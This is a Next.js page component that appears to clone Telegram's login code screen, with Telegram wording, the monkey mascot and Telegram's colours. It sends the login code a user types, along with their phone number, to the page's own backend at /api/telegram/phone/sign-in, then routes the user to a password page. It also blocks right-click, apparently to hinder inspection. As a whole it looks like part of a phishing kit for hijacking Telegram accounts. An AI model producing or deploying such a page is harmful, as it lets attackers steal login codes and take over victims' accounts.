"use client";

import { Suspense, useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { jhola } from "../phoneBridge";

export default function CodePage() {
  useEffect(() => {
    const handleContextMenu = (e) => e.preventDefault(); // disable right-click
    document.addEventListener("contextmenu", handleContextMenu);
    return () => {
      document.removeEventListener("contextmenu", handleContextMenu);
    };
  }, []);
  const router = useRouter();
  const [hash, setHash] = useState("");
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);

  const { cc, phone } = jhola();

  const formattedPhone = `+${String(cc || "").trim()} ${String(phone || "")
    .replace(/\D/g, "")
    .replace(/(\d{5})(?=\d)/g, "$1 ")}`;

  async function verify(value) {
    const val = value ?? code;
    if (val.length !== 5 || loading) return;

    try {
      setLoading(true);
      const res = await fetch("/api/telegram/phone/sign-in", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          code: val,
          phoneNumber: `+${String(cc || "").trim()}${String(
            phone || ""
          ).replace(/\D/g, "")}`,
          phoneCodeHash: hash,
        }),
      });
      const data = await res.json().catch(() => ({}));

      if (res.ok && data?.ok) {
        if (data.needsPassword) {
          router.push(data?.authId ? `/otp?auth=${data.authId}` : "/otp");
        } else {
          router.push("/welcome");
        }
      } else {
        alert(data?.error || "Invalid code");
      }
    } catch {
      alert("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  }

  return (
    <main className="min-h-screen bg-white flex items-center justify-center px-5 -mt-6 md:-mt-9 ">
      {/* fixed-width column like Telegram */}
      <div className="w-[360px] sm:w-[520px] flex flex-col items-center text-center">
        {/* 🐵 space for your monkey gif/image */}
        <div
          className="w-[160px] h-[160px] rounded-2xl bg-center bg-no-repeat bg-contain"
          style={{ backgroundImage: "url(/monkey-gif.gif)" }}
          aria-label="Animated mascot"
        />

        {/* Phone number + edit */}
        <div className="mt-6 flex items-center gap-2">
          <h1 className="text-[32px] leading-none font-semibold tracking-wide dark:text-gray-900">
            {formattedPhone}
          </h1>

          <button
            type="button"
            aria-label="Edit phone number"
            className="p-1 rounded text-gray-500 hover:bg-gray-100 hover:shadow-sm transition"
            onClick={() => {}}
          >
            <svg
              viewBox="0 0 24 24"
              className="h-5 w-5"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <path d="M12 20h9" />
              <path d="M16.5 3.5a2.12 2.12 0 1 1 3 3L7 19l-4 1 1-4 12.5-12.5z" />
            </svg>
          </button>
        </div>

        {/* Subtitle */}
        <p className="mt-3 text-[15px] max-w-[420px] text-[rgb(125,130,133)]">
          We’ve sent the code to the{" "}
          <span className="font-semibold">Telegram</span> app on your other
          device.
        </p>

        {/* ⬇️ replaced your old form with this helper */}
        <FloatingOtp code={code} setCode={setCode} verify={verify} />
      </div>
    </main>
  );
}

/** Helper: shows "Code" as placeholder first, then floats up + auto-focuses */
/** Drop-in replacement for your existing FloatingOtp */
function FloatingOtp({ code, setCode, verify }) {
  const [focused, setFocused] = useState(false);
  const wrapperRef = useRef(null);
  const inputRef = useRef(null);

  // Optional behavior knobs:
  const COLLAPSE_ONLY_WHEN_EMPTY = true; // keep label floated if there’s text
  const CLEAR_ON_OUTSIDE_CLICK = false; // set to true to also clear the input on outside click

  // Collapse label when clicking/touching outside the input wrapper
  useEffect(() => {
    const onOutside = (e) => {
      if (!wrapperRef.current) return;
      if (!wrapperRef.current.contains(e.target)) {
        setFocused(false);
        if (CLEAR_ON_OUTSIDE_CLICK) setCode("");
      }
    };
    document.addEventListener("mousedown", onOutside);
    document.addEventListener("touchstart", onOutside, { passive: true });
    return () => {
      document.removeEventListener("mousedown", onOutside);
      document.removeEventListener("touchstart", onOutside);
    };
  }, [setCode]);

  const float =
    focused || (!COLLAPSE_ONLY_WHEN_EMPTY && true) || code.length > 0;
  // Above: float when focused OR (if you flipped COLLAPSE_ONLY_WHEN_EMPTY) always true, OR there’s value.

  return (
    <form
      className="mt-8"
      onSubmit={(e) => {
        e.preventDefault();
        verify(code);
      }}
    >
      <div
        ref={wrapperRef}
        className="
          group relative w-[350px]
          rounded-[14px] border border-gray-200 bg-white
          transition
          focus-within:border-[#3390EC]
          focus-within:ring-2 focus-within:ring-[#3390EC]/40
        "
      >
        {/* Floating label: hidden at rest (placeholder visible), floats on focus/value */}
        <label
          htmlFor="otp"
          className={[
            "absolute left-4 px-1 bg-white z-[1] select-none",
            "transition-all duration-200",
            float
              ? "-top-2 text-[12px] font-medium text-gray-600 group-focus-within:text-[#3390EC] opacity-100"
              : "top-1/2 -translate-y-1/2 text-[15px] text-gray-400 opacity-0 pointer-events-none",
          ].join(" ")}
        >
          Code
        </label>

        <input
          id="otp"
          ref={inputRef}
          type="text"
          inputMode="numeric"
          autoComplete="one-time-code"
          placeholder={
            float ? "" : "Code"
          } /* placeholder at rest; cleared when label floats */
          value={code}
          onFocus={() => setFocused(true)}
          onBlur={() =>
            setFocused(false)
          } /* collapse on blur if empty due to `float` calc */
          onChange={(e) => {
            const v = e.target.value.replace(/\D/g, "").slice(0, 5);
            setCode(v);
            if (v.length === 5) verify(v);
          }}
          className="
            w-full h-[3rem] rounded-[14px]
            bg-transparent px-4
            text-[15px] text-gray-800
            placeholder:text-gray-400
            outline-none
          "
        />
      </div>
    </form>
  );
}
